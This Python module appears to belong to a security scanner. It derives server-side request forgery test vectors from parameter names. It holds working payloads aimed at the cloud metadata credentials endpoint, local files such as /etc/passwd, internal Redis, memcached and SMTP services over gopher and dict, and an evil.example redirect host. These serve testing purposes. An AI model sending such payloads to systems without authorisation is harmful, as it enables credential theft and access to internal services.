

from collections.abc import Collection, Iterable
from dataclasses import dataclass, field
import re

from services.aiva_common.schemas import FunctionTaskPayload

OAST_PLACEHOLDER = "{oast}"  # Placeholder replaced with dispatcher callback URL.


@dataclass
class SsrfTestVector:
    payload: str
    description: str
    requires_oast: bool = False
    location: str | None = None
    parameter: str | None = None
    follow_redirects: bool = True


@dataclass
class AnalysisPlan:
    vectors: list[SsrfTestVector] = field(default_factory=list)


class ParamSemanticsAnalyzer:
    """Inspect task metadata and derive SSRF payload candidates."""

    _REDIRECT_KEYWORDS = {
        "url",
        "target",
        "dest",
        "redirect",
        "next",
        "return",
        "callback",
        "webhook",
        "forward",
        "continue",
    }

    _FILE_KEYWORDS = {"file", "path", "template", "config"}
    _PROTOCOL_KEYWORDS = {"gopher", "smb", "ftp", "dict", "ldap"}

    _DEFAULT_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
    ]

    _FILE_PAYLOADS = ["file:///etc/passwd", "file:///c:/windows/win.ini"]
    _PROTOCOL_PAYLOADS = [
        "gopher://127.0.0.1:6379/_HELLO",
        "dict://127.0.0.1:11211/info",
    ]

    # Additional cross-protocol payloads (opt-in via test_config or header)
    _CROSS_PROTOCOL_PAYLOAD_MAP: dict[str, list[str]] = {
        "gopher": [
            "gopher://127.0.0.1:11211/_stats",
            "gopher://127.0.0.1:25/_VRFY%20root",
        ],
        "ftp": [
            "ftp://127.0.0.1:21/",
        ],
        "dict": [
            "dict://127.0.0.1:11211/info",
        ],
        "ldap": [
            "ldap://127.0.0.1:389/",
        ],
        "smb": [
            "smb://127.0.0.1/share",
        ],
    }

    def analyze(self, task: FunctionTaskPayload) -> AnalysisPlan:
        parameter = (task.target.parameter or "").strip()
        location = (task.target.parameter_location or "query").lower()
        tokens = self._tokenize(parameter)

        plan = AnalysisPlan()

        payloads = list(self._build_payloads(task))
        requires_redirect = bool(self._REDIRECT_KEYWORDS & tokens)
        requires_file = bool(self._FILE_KEYWORDS & tokens)
        requires_protocol = bool(self._PROTOCOL_KEYWORDS & tokens)

        if not payloads:
            payloads = list(self._DEFAULT_PAYLOADS)

        for payload in payloads:
            plan.vectors.append(
                SsrfTestVector(
                    payload=payload,
                    description="Standard SSRF probe",
                    location=location,
                    parameter=parameter or None,
                )
            )

        if requires_redirect:
            plan.vectors.append(
                SsrfTestVector(
                    payload="http://evil.example/redirect",
                    description="Open redirect verification",
                    location=location,
                    parameter=parameter or None,
                )
            )

        if requires_file:
            for payload in self._FILE_PAYLOADS:
                plan.vectors.append(
                    SsrfTestVector(
                        payload=payload,
                        description="File scheme probing",
                        location=location,
                        parameter=parameter or None,
                        follow_redirects=False,
                    )
                )

        if requires_protocol:
            for payload in self._PROTOCOL_PAYLOADS:
                plan.vectors.append(
                    SsrfTestVector(
                        payload=payload,
                        description="Alternate protocol probing",
                        location=location,
                        parameter=parameter or None,
                        follow_redirects=False,
                    )
                )

        # Opt-in: cross-protocol expansion via test_config or explicit header
        requested = {p.strip().lower() for p in (task.test_config.payloads or [])}
        headers = task.target.headers or {}
        protocols_hdr = headers.get("X-SSRF-Protocols")
        selected_protocols: set[str] = set()
        if protocols_hdr:
            selected_protocols = {
                p.strip().lower() for p in protocols_hdr.split(",") if p.strip()
            }
        elif {"cross", "advanced"} & requested:
            # If advanced requested but no explicit header, include a conservative set
            selected_protocols = {"gopher", "ftp", "dict"}

        for proto in selected_protocols:
            for payload in self._CROSS_PROTOCOL_PAYLOAD_MAP.get(proto, []):
                plan.vectors.append(
                    SsrfTestVector(
                        payload=payload,
                        description=f"Cross-protocol probing ({proto})",
                        location=location,
                        parameter=parameter or None,
                        follow_redirects=False,
                    )
                )

        if self._should_enable_oast(tokens, task):
            plan.vectors.append(
                SsrfTestVector(
                    payload=f"{OAST_PLACEHOLDER}/ssrf",
                    description="Out-of-band callback validation",
                    location=location,
                    parameter=parameter or None,
                    requires_oast=True,
                )
            )

        return plan

    def _build_payloads(self, task: FunctionTaskPayload) -> Iterable[str]:
        seen = set()

        for payload in task.custom_payloads or []:
            normalized = payload.strip()
            if normalized and normalized not in seen:
                seen.add(normalized)
                yield normalized

        for payload in task.test_config.custom_payloads or []:
            normalized = payload.strip()
            if normalized and normalized not in seen:
                seen.add(normalized)
                yield normalized

        for payload in task.test_config.payloads:
            normalized = payload.strip()
            if normalized and normalized.lower() == "basic":
                continue
            if normalized and normalized not in seen:
                seen.add(normalized)
                yield normalized

        for payload in self._DEFAULT_PAYLOADS:
            if payload not in seen:
                seen.add(payload)
                yield payload

    def _should_enable_oast(
        self, tokens: Collection[str], task: FunctionTaskPayload
    ) -> bool:
        token_set = set(tokens)
        if {"callback", "webhook"} & token_set:
            return True
        if {"notify", "ping"} & token_set:
            return True
        payload_sources: list[str] = []
        if task.custom_payloads:
            payload_sources.extend(task.custom_payloads)
        payload_sources.extend(task.test_config.custom_payloads or [])
        if payload_sources:
            return any(OAST_PLACEHOLDER in payload for payload in payload_sources)
        return False

    def _tokenize(self, parameter: str) -> set[str]:
        if not parameter:
            return set()
        normalized = re.sub(r"([A-Z])", r"_\1", parameter).lower()
        parts = re.split(r"[^a-z0-9]+", normalized)
        return {part for part in parts if part}
